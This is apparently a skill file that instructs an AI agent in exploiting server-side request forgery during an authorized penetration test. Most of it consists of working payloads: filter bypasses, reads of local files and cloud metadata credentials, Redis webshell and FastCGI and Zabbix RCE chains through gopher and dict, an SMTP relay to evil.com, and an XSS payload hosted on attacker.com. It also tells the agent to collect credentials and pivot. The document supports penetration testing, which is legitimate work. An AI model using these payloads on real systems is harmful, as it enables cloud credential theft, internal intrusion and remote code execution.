---
name: ssrf
description: >
  Guide server-side request forgery (SSRF) exploitation during authorized
  penetration testing.
keywords:
  - SSRF
  - server-side request forgery
  - URL fetch
  - webhook exploit
  - cloud metadata
  - 169.254.169.254
  - IMDS
  - internal port scan
  - gopher SSRF
  - blind SSRF
  - SSRF to RCE
  - SSRF bypass
  - file:// read
  - SSRF filter bypass
tools:
  - burpsuite
  - ssrfmap
  - gopherus
  - interactsh
opsec: low
---

# Server-Side Request Forgery (SSRF)

You are helping a penetration tester exploit server-side request forgery. The
target application accepts a URL or hostname from user input and makes a
server-side HTTP request to it. The goal is to access internal services, cloud
metadata, local files, or pivot to RCE via internal service exploitation. All
testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[ssrf] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Identified parameter that triggers server-side HTTP requests (URL, webhook,
  import, proxy, PDF generator, image fetcher, etc.)
- OOB callback infrastructure for blind SSRF (Burp Collaborator, interactsh, or
  custom server)
- If the response is fully reflected, start with basic SSRF. If only status
  codes or timing differences are visible, use blind techniques.

## Step 1: Assess

If not already provided, determine:
1. **Injection point** — which parameter accepts a URL? (url=, src=, href=,
   redirect=, callback=, webhook=, proxy=, imageUrl=, file=)
2. **Response type** — full response returned? Status only? Blind?
3. **Protocol support** — does it accept only http(s), or also file://, gopher://, dict://?
4. **Filters** — is localhost blocked? Are internal IPs blocked? Allowlist?

Skip if context was already provided.

## Step 2: Basic SSRF

### Localhost Access

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:443
```

### Internal Network Scanning

```
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://192.168.0.1:8080
```

Scan common internal ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL),
5432 (PostgreSQL), 6379 (Redis), 8080 (alt HTTP), 8443 (alt HTTPS), 9200
(Elasticsearch), 27017 (MongoDB).

### File Read (file:// protocol)

```
file:///etc/passwd
file:///etc/hostname
file:///proc/self/environ
file:///proc/self/cmdline
file://\/\/etc/passwd
```

## Step 3: Filter Bypass

### IPv6 Notation

```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### Domain Redirects to Localhost

| Domain | Resolves To |
|---|---|
| `localtest.me` | `::1` |
| `localh.st` | `127.0.0.1` |
| `127.0.0.1.nip.io` | `127.0.0.1` |
| `spoofed.redacted.oastify.com` | `127.0.0.1` |
| `ip6-localhost` | `::1` (Linux) |

### CIDR Range (127.0.0.0/8)

```
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### Short-Hand IP

```
http://0/
http://127.1
http://127.0.1
```

### IP Encoding

**Decimal:**
```
http://2130706433/        = 127.0.0.1
http://2852039166/        = 169.254.169.254
```

**Hex:**
```
http://0x7f000001         = 127.0.0.1
http://0xa9fea9fe         = 169.254.169.254
```

**Octal:**
```
http://0177.0.0.1/        = 127.0.0.1
http://0251.0376.0251.0376 = 169.254.169.254
```

**Mixed encoding:**
```
http://0251.254.169.254   = 169.254.169.254 (octal + decimal)
```

### URL Encoding

```
http://127.0.0.1/%61dmin       (single encode)
http://127.0.0.1/%2561dmin     (double encode)
```

### URL Parsing Discrepancy

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

Different parsers resolve `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/` differently:
urllib2 → 1.1.1.1, requests → 2.2.2.2, urllib → 3.3.3.3.

### HTTP Redirect Bypass (TOCTOU)

Many URL validators check the initial URL but the underlying HTTP library
follows 302/307 redirects without re-validating the destination. This is a
Time-of-Check-Time-of-Use (TOCTOU) gap — point the SSRF at your server,
which redirects to the internal target.

```
# Using r3dir.me (no server needed)
https://307.r3dir.me/--to/?url=http://localhost
https://307.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/
```

Or host a Python redirect server on the attackbox:
```bash
# Usage: python3 redir.py <target_url> [port]
# Example: python3 redir.py http://127.0.0.1:9001/ 8888
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys
class R(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[1])
        self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', int(sys.argv[2]) if len(sys.argv)>2 else 8888), R).serve_forever()
" "http://127.0.0.1:PORT/path" 8888
```

Then point the SSRF at `http://ATTACKBOX_IP:8888/anything`.

**Constraint:** If your attackbox is on a private IP (10.x, 172.16-31.x,
192.168.x) and the validator also blocks private IPs in the initial URL,
the redirect server won't be reachable. Workarounds: use r3dir.me (public
IP), use DNS rebinding (below), or check if the validator ignores IPv6.

Use HTTP 307/308 to preserve the original HTTP method and body.

### DNS Rebinding

Make a domain alternate between two IPs:
```
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

First resolution → 1.2.3.4 (passes allowlist), second → 169.254.169.254
(hits metadata).

### PHP filter_var() Bypass

```
http://test???test.com
0://evil.com:80;http://google.com:80/
```

### JAR Scheme (Java — blind)

```
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
```

### Enclosed Alphanumeric / Unicode

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

## Step 4: Cloud Metadata Exploitation

### AWS (IMDSv1 — no headers needed)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

**IMDSv2** (requires PUT to get token first — harder via SSRF):
```bash
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

IMDSv2 can sometimes be bypassed via gopher:// to craft the PUT request.

**AWS ECS** (container credentials):
```
# Extract UUID from /proc/self/environ first
http://169.254.170.2/v2/credentials/<UUID>
```

**AWS Lambda:**
```
http://localhost:9001/2018-06-01/runtime/invocation/next
```

### Google Cloud (requires Metadata-Flavor: Google header)

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json
```

**Beta endpoint (no header required):**
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

**Via gopher (to set required header):**
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

### Azure (requires Metadata: true header)

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Other Cloud Providers

| Provider | Metadata URL |
|---|---|
| Digital Ocean | `http://169.254.169.254/metadata/v1.json` |
| Oracle Cloud | `http://192.0.0.192/latest/meta-data/` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` |
| Hetzner | `http://169.254.169.254/hetzner/v1/metadata` |

### Kubernetes / Docker

```
# Kubernetes ETCD
http://127.0.0.1:2379/v2/keys/?recursive=true

# Docker API
http://127.0.0.1:2375/v1.24/containers/json

# Rancher
http://rancher-metadata/latest/
```

## Step 5: Protocol Exploitation

### gopher:// — TCP Protocol Interaction

Gopher can send arbitrary data to any TCP port. Use Gopherus to generate
payloads:

```bash
# Redis webshell
python2.7 gopherus.py --exploit redis

# MySQL query (passwordless user)
python2.7 gopherus.py --exploit mysql

# FastCGI RCE
python2.7 gopherus.py --exploit fastcgi

# Memcached deserialization
python2.7 gopherus.py --exploit pymemcache
```

### Redis via SSRF (webshell)

**Via dict://**:
```
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
dict://127.0.0.1:6379/SAVE
```

**Via gopher://**:
```
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20shell.php
gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save
```

### FastCGI RCE (via gopher)

Requires knowing a PHP file path on disk (default: `/usr/share/php/PEAR.php`):
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00...
```

Use Gopherus to generate the full payload.

### SMTP Relay (via gopher)

```
gopher://localhost:25/_MAIL%20FROM:<attacker@evil.com>%0D%0ARCPT%20TO:<victim@target.com>%0D%0ADATA%0D%0ASubject:%20SSRF%20Test%0D%0A%0D%0AMessage%20body%0D%0A.%0D%0A
```

### Zabbix Agent RCE

If `EnableRemoteCommands=1`:
```
gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
```

## Step 6: Blind SSRF

When the response is not returned to you.

### Detection

```bash
# OOB callback (Burp Collaborator / interactsh)
http://COLLABORATOR.oastify.com
http://ATTACKER.interactsh.com

# Time-based (compare response time for open vs closed ports)
http://127.0.0.1:22    # SSH — fast connect
http://127.0.0.1:1234  # closed — timeout
```

### Blind SSRF Chains

Exploit internal services that accept HTTP and perform actions:

| Service | Exploit |
|---|---|
| Elasticsearch | `http://127.0.0.1:9200/_shutdown` |
| Jenkins | `http://127.0.0.1:8080/script` |
| Docker | `http://127.0.0.1:2375/containers/json` |
| Redis (via HTTP) | Write webshell via CONFIG SET |
| Consul | `http://127.0.0.1:8500/v1/agent/self` |
| Solr | `http://127.0.0.1:8983/solr/admin/cores` |

Full list: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

### Upgrade Blind SSRF to XSS

If the SSRF fetches and renders content:
```
http://attacker.com/xss.svg
```

Where `xss.svg` contains:
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

## Step 7: Escalate or Pivot

- **Got AWS credentials**: Use `aws configure` with the extracted
  AccessKeyId/SecretAccessKey/Token to access S3, EC2, IAM
- **Got internal service access**: Check for unauthenticated admin panels,
  databases, Redis, Elasticsearch
- **Redis accessible**: Write webshell via CONFIG SET → RCE
- **FastCGI accessible**: RCE via gopher payload
- **Kubernetes ETCD accessible**: Extract secrets, service account tokens
- **Docker API accessible**: Container escape, host filesystem access
- **Internal web app found**: Test for additional vulns — route to
  **web-discovery**
- **File read only (file://)**: Extract credentials from config files, SSH keys
  from `/home/*/.ssh/`, cloud credentials from `~/.aws/credentials`
- **Found SQLi on internal service**: Escalate or
  **sql-injection-union**

Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: SSRF endpoint, protocols supported, bypass technique
used, what's accessible internally.

## OPSEC Notes

- SSRF requests originate from the server — appear in the target's outbound logs
- Cloud metadata access may trigger CloudTrail events (AWS) or audit logs
- gopher:// and dict:// protocol abuse may be detected by IDS/IPS
- Redis CONFIG SET and webshell creation leave artifacts
- DNS rebinding generates unusual DNS patterns
- Blind SSRF with OOB callbacks reveal your attacker IP

## Troubleshooting

### No Response from Internal Services

- The app may strip non-http protocols — try `http://` only with internal IPs
- The app may block private IPs — use bypass techniques (DNS rebinding, redirect,
  encoded IPs)
- HTTP redirect may not be followed — try 301, 302, 307, 308
- Response may be filtered — check if error messages leak information

### Cloud Metadata Blocked

- Try IP encoding (decimal, hex, octal, IPv6-mapped)
- Try DNS resolution: `169.254.169.254.nip.io`
- Try HTTP redirect via your server or r3dir.me
- Try DNS rebinding: `make-YOUR.IP-rebind-169.254-169.254-rr.1u.ms`
- For GCP/Azure (header required), use gopher:// to set the header

### IMDSv2 Blocking Access

- IMDSv2 requires a PUT request with token header — cannot be done with simple
  GET SSRF
- Check if the app follows redirects (redirect from your server can set headers)
- Try gopher:// to craft the full PUT request
- Check if IMDSv1 is still enabled alongside v2
- Check ECS credential endpoint (169.254.170.2) which may not require tokens

### gopher:// Not Supported

- Try dict:// for Redis (limited but works for simple commands)
- Try file:// for local file read
- Use HTTP-based exploitation paths (blind SSRF chains via internal HTTP services)
- Try netdoc:// (Java environments)

### Automated Tools

```bash
# SSRFmap — automatic SSRF exploitation
python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan

# Gopherus — generate gopher payloads for various services
python2.7 gopherus.py --exploit redis
python2.7 gopherus.py --exploit fastcgi
python2.7 gopherus.py --exploit mysql

# interactsh — OOB callback server
interactsh-client

# ipfuscator — generate IP encoding variations
ipfuscator -i 169.254.169.254
```
